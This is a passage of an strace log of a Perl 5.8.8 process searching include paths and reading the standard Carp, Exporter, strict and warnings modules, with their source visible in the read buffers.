$CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
9851  20:00:43.703662 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
9851  20:00:43.703691 read(8, "", 4096) = 0
9851  20:00:43.703703 close(8)          = 0
9851  20:00:43.703725 stat64("/etc/perl/Exporter.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.703739 stat64("/etc/perl/Exporter.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.703753 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.703766 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.703780 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.703793 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.703808 stat64("/usr/lib/perl5/Exporter.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.703820 stat64("/usr/lib/perl5/Exporter.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.703833 stat64("/usr/share/perl5/Exporter.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.703846 stat64("/usr/share/perl5/Exporter.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.703859 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.703872 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.703886 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.703899 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
9851  20:00:43.703921 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
9851  20:00:43.703944 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef7b8) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.703957 _llseek(8, 0, [0], SEEK_CUR) = 0
9851  20:00:43.703974 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
9851  20:00:43.704423 _llseek(8, 2217, [2217], SEEK_SET) = 0
9851  20:00:43.704450 _llseek(8, 0, [2217], SEEK_CUR) = 0
9851  20:00:43.704461 close(8)          = 0
9851  20:00:43.704537 stat64("/etc/perl/strict.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.704553 stat64("/etc/perl/strict.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.704567 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.704580 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.704594 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.704607 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.704622 stat64("/usr/lib/perl5/strict.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.704634 stat64("/usr/lib/perl5/strict.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.704647 stat64("/usr/share/perl5/strict.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.704659 stat64("/usr/share/perl5/strict.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.704673 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.704686 stat64("/usr/lib/perl/5.8/strict.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.704700 stat64("/usr/share/perl/5.8/strict.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.704712 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
9851  20:00:43.704734 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
9851  20:00:43.704749 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef7b8) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.704760 _llseek(8, 0, [0], SEEK_CUR) = 0
9851  20:00:43.704780 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
9851  20:00:43.704920 _llseek(8, 598, [598], SEEK_SET) = 0
9851  20:00:43.704945 _llseek(8, 0, [598], SEEK_CUR) = 0
9851  20:00:43.704960 close(8)          = 0
9851  20:00:43.705000 stat64("/etc/perl/warnings.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.705015 stat64("/etc/perl/warnings.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.705029 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.705042 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.705056 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.705069 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.705083 stat64("/usr/lib/perl5/warnings.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.705095 stat64("/usr/lib/perl5/warnings.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.705109 stat64("/usr/share/perl5/warnings.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.705121 stat64("/usr/share/perl5/warnings.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.705135 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.705148 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.705161 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.705174 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
9851  20:00:43.705196 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
9851  20:00:43.705210 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef7b8) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.705222 _llseek(8, 0, [0], SEEK_CUR) = 0
9851  20:00:43.705240 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
9851  20:00:43.705620 brk(0x81b6000)    = 0x81b6000
9851  20:00:43.705637 brk(0x81b5000)    = 0x81b5000
9851  20:00:43.705718 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
9851  20:00:43.706194 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') 